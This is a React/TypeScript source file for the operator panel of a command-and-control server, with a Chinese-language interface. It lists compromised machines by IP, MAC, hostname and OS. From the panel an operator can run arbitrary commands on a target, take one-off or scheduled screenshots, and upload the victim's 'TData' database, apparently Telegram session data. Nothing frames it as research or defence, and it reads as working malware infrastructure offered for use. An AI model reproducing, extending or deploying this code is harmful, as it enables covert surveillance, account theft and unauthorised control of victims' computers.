import { listC2DeviceVoByPageUsingPost, deleteC2DeviceUsingPost, updateHeartbeatUsingPost } from '@/services/backend/c2DeviceController';
import { addC2TaskUsingPost, listC2TaskVoByPageUsingPost } from '@/services/backend/c2TaskController';
import type { ActionType, ProColumns } from '@ant-design/pro-components';
import { PageContainer, ProTable, ModalForm, ProFormSelect, ProFormText, ProFormTextArea } from '@ant-design/pro-components';
import '@umijs/max';
import { Button, message, Tag, Space, Typography, Image, Popconfirm, Modal, Dropdown, Menu } from 'antd';
import { DownOutlined, CameraOutlined, PlayCircleOutlined, PauseCircleOutlined, CloudUploadOutlined } from '@ant-design/icons';
import React, { useRef, useState } from 'react';

const C2DevicePage: React.FC = () => {
  const actionRef = useRef<ActionType>();
  const [createModalVisible, setCreateModalVisible] = useState<boolean>(false);
  const [heartbeatModalVisible, setHeartbeatModalVisible] = useState<boolean>(false);
  const [currentDeviceId, setCurrentDeviceId] = useState<string>('');
  const [currentHeartbeat, setCurrentHeartbeat] = useState<number>(60000);
  
  // 结果查看 Modal 状态
  const [resultModalVisible, setResultModalVisible] = useState<boolean>(false);
  const [currentResultContent, setCurrentResultContent] = useState<string>('');

  const handleUpdateHeartbeat = async (id: number, interval: number) => {
    const hide = message.loading('正在更新心跳');
    try {
      await updateHeartbeatUsingPost({ id: id, heartbeatInterval: interval });
      hide();
      message.success('更新成功');
      actionRef.current?.reload();
      return true;
    } catch (error: any) {
      hide();
      message.error('更新失败，' + error.message);
      return false;
    }
  };
  
  const handleDelete = async (row: API.C2DeviceVO) => {
    const hide = message.loading('正在删除');
    if (!row) return true;
    try {
      await deleteC2DeviceUsingPost({
        id: row.id as any,
      });
      hide();
      message.success('删除成功');
      actionRef?.current?.reload();
      return true;
    } catch (error: any) {
      hide();
      message.error('删除失败，' + error.message);
      return false;
    }
  };

  const handleAddTask = async (fields: API.C2TaskAddRequest) => {
    const hide = message.loading('正在下发任务');
    try {
      await addC2TaskUsingPost({ ...fields });
      hide();
      message.success('任务下发成功');
      return true;
    } catch (error: any) {
      hide();
      message.error('任务下发失败，' + error.message);
      return false;
    }
  };

  /**
   * 渲染任务子表格
   */
  const expandedRowRender = (record: API.C2DeviceVO) => {
    const taskColumns: ProColumns<API.C2TaskVO>[] = [
      { title: '命令', dataIndex: 'command', width: 100 },
      { title: '参数', dataIndex: 'params', width: 150, ellipsis: true },
      { 
        title: '状态', 
        dataIndex: 'status', 
        width: 100,
        valueEnum: {
          pending: { text: '等待中', status: 'Default' },
          completed: { text: '已完成', status: 'Success' },
          failed: { text: '失败', status: 'Error' },
        },
      },
      {
        title: '执行结果 / 截图',
        dataIndex: 'result',
        render: (_, task) => {
          if (!task.result) return '-';
          
          // 判断是否为图片（Base64 或 截图命令）
          const isImage = task.command === 'screenshot' || task.command === 'start_monitor' || task.result.startsWith('iVBORw0KGgo') || task.result.startsWith('data:image');
          
          if (isImage && task.status === 'completed') {
             // 尝试提取 base64 (如果不是完整的 data:image 格式，自动补全)
             const src = task.result.startsWith('data:image') ? task.result : `data:image/png;base64,${task.result}`;
             return <Image src={src} width={100} />;
          }
          
          const content = task.result;
          const maxLength = 100;
          const isLongText = content.length > maxLength;
          
          return (
            <div>
              <Typography.Paragraph
                style={{ marginBottom: 0 }}
                ellipsis={{ rows: 2 }}
              >
                {content}
              </Typography.Paragraph>
              {isLongText && (
                  <a onClick={() => {
                      setCurrentResultContent(content);
                      setResultModalVisible(true);
                  }}>
                      查看完整结果
                  </a>
              )}
            </div>
          );
        },
      },
      { title: '创建时间', dataIndex: 'createTime', valueType: 'dateTime', width: 180 },
    ];

    return (
      <ProTable<API.C2TaskVO>
        columns={taskColumns}
        headerTitle={false}
        search={false}
        options={false}
        rowKey="id"
        request={async (params) => {
          const { data, code } = await listC2TaskVoByPageUsingPost({
            ...params,
            deviceId: record.id,
            pageSize: 100,
            sortField: 'createTime',
            sortOrder: 'descend',
          } as API.C2TaskQueryRequest);
          return {
            success: code === 0,
            data: data?.records || [],
            total: data?.total || 0,
          };
        }}
        pagination={false}
      />
    );
  };

  const columns: ProColumns<API.C2DeviceVO>[] = [
    {
      title: '设备UUID',
      dataIndex: 'uuid',
      valueType: 'text',
      copyable: true,
      width: 150,
      ellipsis: true,
    },
    {
      title: '设备ID',
      dataIndex: 'id',
      valueType: 'text',
      hideInForm: true,
      hideInTable: true,
    },
    {
      title: '内网IP',
      dataIndex: 'internalIp',
      valueType: 'text',
    },
    {
      title: 'MAC地址',
      dataIndex: 'macAddress',
      valueType: 'text',
      copyable: true,
    },
    {
      title: '外网IP',
      dataIndex: 'externalIp',
      valueType: 'text',
    },
    {
      title: '主机名',
      dataIndex: 'hostName',
      valueType: 'text',
    },
    {
      title: '操作系统',
      dataIndex: 'os',
      valueType: 'text',
    },
    {
      title: '在线状态',
      dataIndex: 'status',
      hideInSearch: true,
      render: (_, record) => {
        if (!record.lastSeen) return <Tag color="red">离线</Tag>;
        const lastSeen = new Date(record.lastSeen).getTime();
        const now = new Date().getTime();
        const isOnline = (now - lastSeen) < 2 * 60 * 1000;
        return isOnline ? <Tag color="green">在线</Tag> : <Tag color="red">离线</Tag>;
      },
    },
    {
      title: '心跳间隔 (秒)',
      dataIndex: 'heartbeatInterval',
      valueType: 'digit',
      hideInSearch: true,
      render: (_, record) => {
          return (record.heartbeatInterval || 60000) / 1000;
      }
    },
    {
      title: '最后活跃',
      dataIndex: 'lastSeen',
      valueType: 'dateTime',
      hideInSearch: true,
    },
    {
      title: '操作',
      dataIndex: 'option',
      valueType: 'option',
      render: (_, record) => {
          const menu = (
            <Menu onClick={async (e) => {
                if (e.key === 'screenshot') {
                     await handleAddTask({
                        deviceId: record.id,
                        command: 'screenshot',
                        params: ''
                     });
                } else if (e.key === 'start_monitor') {
                     await handleAddTask({
                        deviceId: record.id,
                        command: 'start_monitor',
                        params: String(record.heartbeatInterval || 60000)
                     });
                } else if (e.key === 'stop_monitor') {
                     await handleAddTask({
                        deviceId: record.id,
                        command: 'stop_monitor',
                        params: ''
                     });
                } else if (e.key === 'upload_db') {
                     await handleAddTask({
                        deviceId: record.id,
                        command: 'upload_db',
                        params: ''
                     });
                }
            }}>
                <Menu.Item key="screenshot" icon={<CameraOutlined />}>屏幕截图</Menu.Item>
                <Menu.Item key="start_monitor" icon={<PlayCircleOutlined />}>开启定时截图</Menu.Item>
                <Menu.Item key="stop_monitor" icon={<PauseCircleOutlined />}>停止定时截图</Menu.Item>
                <Menu.Item key="upload_db" icon={<CloudUploadOutlined />}>上传TData数据库</Menu.Item>
            </Menu>
          );
          
          return [
        <a
          key="task"
          onClick={() => {
            setCurrentDeviceId(String(record.id));
            setCreateModalVisible(true);
          }}
        >
          执行命令
        </a>,
        <a
          key="heartbeat"
          onClick={() => {
            setCurrentDeviceId(String(record.id));
            setCurrentHeartbeat(record.heartbeatInterval || 60000);
            setHeartbeatModalVisible(true);
          }}
        >
          设置心跳
        </a>,
        <Dropdown overlay={menu} key="more">
            <a onClick={e => e.preventDefault()}>
                更多 <DownOutlined />
            </a>
        </Dropdown>,
        <Popconfirm
          key="delete"
          title="确定要删除吗？"
          onConfirm={() => handleDelete(record)}
        >
          <a style={{ color: 'red' }}>删除</a>
        </Popconfirm>,
      ];
      },
    },
  ];

  return (
    <PageContainer>
      <ProTable<API.C2DeviceVO>
        headerTitle={'C2 设备列表（展开可查看该设备的所有任务及结果）'}
        actionRef={actionRef}
        rowKey="id"
        search={{
          labelWidth: 120,
        }}
        toolBarRender={() => [
          <Button
            key="refresh"
            onClick={() => {
              actionRef.current?.reload();
            }}
          >
            刷新列表
          </Button>,
        ]}
        expandable={{ 
            expandedRowRender,
            // 每次展开都重新渲染，确保加载最新数据
            destroyOnClose: true
        }}
        request={async (params, sort, filter) => {
          const sortField = Object.keys(sort)?.[0];
          const sortOrder = sort?.[sortField] ?? undefined;

          const { data, code } = await listC2DeviceVoByPageUsingPost({
            ...params,
            sortField,
            sortOrder,
            ...filter,
          } as API.C2DeviceQueryRequest);

          return {
            success: code === 0,
            data: data?.records || [],
            total: Number(data?.total) || 0,
          };
        }}
        columns={columns}
      />
      <ModalForm
        title={'执行CMD命令'}
        width="400px"
        visible={createModalVisible}
        onVisibleChange={setCreateModalVisible}
        modalProps={{ destroyOnClose: true }}
        onFinish={async (value) => {
          const success = await handleAddTask({
            ...value,
            command: 'cmd_exec', // 强制指定命令类型
            deviceId: Number(currentDeviceId)
          } as API.C2TaskAddRequest);
          if (success) {
            setCreateModalVisible(false);
            // 这里应该重新加载设备列表，从而触发展开行的重新渲染
            actionRef.current?.reload();
          }
        }}
      >
        {/* 隐藏的 deviceId 字段，确保表单提交时包含该字段 */}
        <ProFormText name="deviceId" initialValue={currentDeviceId} hidden />
        <ProFormText
          label="设备ID"
          name="deviceIdDisplay"
          disabled
          initialValue={currentDeviceId}
        />
        {/* 原本的命令选择已移除，默认执行 cmd_exec */}
        
        <ProFormTextArea
          label="CMD命令内容"
          name="params"
          placeholder="请输入要在目标机器执行的命令 (如 whoami, ipconfig)"
          rules={[{ required: true, message: '请输入命令内容' }]}
        />
      </ModalForm>
      <ModalForm
        title={'设置心跳间隔'}
        width="400px"
        visible={heartbeatModalVisible}
        onVisibleChange={setHeartbeatModalVisible}
        modalProps={{ destroyOnClose: true }}
        onFinish={async (value) => {
          const success = await handleUpdateHeartbeat(Number(currentDeviceId), value.heartbeatInterval * 1000);
          if (success) {
            setHeartbeatModalVisible(false);
          }
        }}
      >
        <ProFormText
          label="设备ID"
          name="deviceIdDisplay"
          disabled
          initialValue={currentDeviceId}
        />
        <ProFormSelect
          label="心跳间隔 (秒)"
          name="heartbeatInterval"
          rules={[{ required: true, message: '请选择心跳间隔' }]}
          valueEnum={{
            10: '10秒',
            30: '30秒',
            60: '60秒',
            300: '5分钟',
            600: '10分钟',
          }}
          initialValue={currentHeartbeat / 1000}
        />
      </ModalForm>
      
      {/* 结果查看 Modal */}
      <Modal
        title="完整执行结果"
        visible={resultModalVisible}
        onCancel={() => setResultModalVisible(false)}
        footer={[
            <Button key="close" onClick={() => setResultModalVisible(false)}>
                关闭
            </Button>
        ]}
        width={800}
      >
        <div style={{ maxHeight: '60vh', overflow: 'auto', whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
            {currentResultContent}
        </div>
      </Modal>
    </PageContainer>
  );
};

export default C2DevicePage;
